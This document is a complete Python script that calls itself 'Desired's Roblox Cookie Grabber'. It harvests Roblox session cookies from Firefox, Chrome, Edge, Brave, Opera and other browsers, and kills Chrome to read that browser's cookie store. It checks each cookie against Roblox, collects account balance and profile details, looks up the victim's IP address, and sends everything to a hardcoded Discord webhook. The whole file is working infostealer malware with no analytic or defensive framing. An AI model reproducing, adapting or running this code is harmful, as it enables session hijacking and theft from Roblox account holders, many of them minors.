try:
    import robloxpy, requests, browser_cookie3, os
except Exception as e:
    print(str(e)[16:].replace("'", "") + ' is not installed, run install.bat first.'), exit()

class SMTHGRB:
    def __init__(self, webhook: str):
        if not "discord.com/api/webhooks/" in webhook:
            print('You did not provide a webhook on Line 148.'), exit()


        self.webhook = webhook
        self.cookie = None
        self.platform = None
        self.embeds = []

        self.browsers()

    def checker(self):
        if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
            return requests.post(url=self.webhook, data={'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})

        for embed in self.embeds:
            if self.cookie in embed['description']:
                return
        
        user = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":self.cookie}).json()
        id = user['UserID']
        try:
            ip = requests.get('https://api.ipify.org/').text
        except:
            ## It could not get any connection, so we just do a "N/A" Value
            ip = "N/A"
        self.embeds.append(
            {
                "title": f"✔ Valid Account - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{ip}**||\n\nCookie:\n||```fix\n{self.cookie}```||",
                "color": 12452044,
                "footer": {
                    "text": "Desired So Cute"
                }
            }
        )

        
    def browsers(self):
        try:
            self.platform = "Firefox"
            for cookie in browser_cookie3.firefox(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        
        try:
            self.platform = "Safari"
            for cookie in browser_cookie3.safari(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chromium"
            for cookie in browser_cookie3.chromium(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Edge"
            for cookie in browser_cookie3.edge(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera GX"
            for cookie in browser_cookie3.opera_gx(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass
        
        try:
            self.platform = "Opera" 
            for cookie in browser_cookie3.opera(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Brave"
            for cookie in browser_cookie3.brave(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chrome" 
            os.system("taskkill /f /im chrome.exe")
            for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Librewolf"
            for cookie in browser_cookie3.librewolf(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        if len(self.embeds) != 0:

            self.send()

    def send(self):
        requests.post(self.webhook, json={
            "username": "Desired's Roblox Cookie Grabber",
            "content": "@everyone",
            "avatar_url": "https://cdn.discordapp.com/avatars/1071205151811047485/7040d46900906747222042831ac0301c.webp?size=128",
            "embeds": self.embeds
        })


SMTHGRB("https://discord.com/api/webhooks/1138442752011554876/rso2yE9FoE-Fz237DWo18giS2syBqDVzBJk2aGLKMqec8VDAahaziOShFIdBOcwd4dbN")
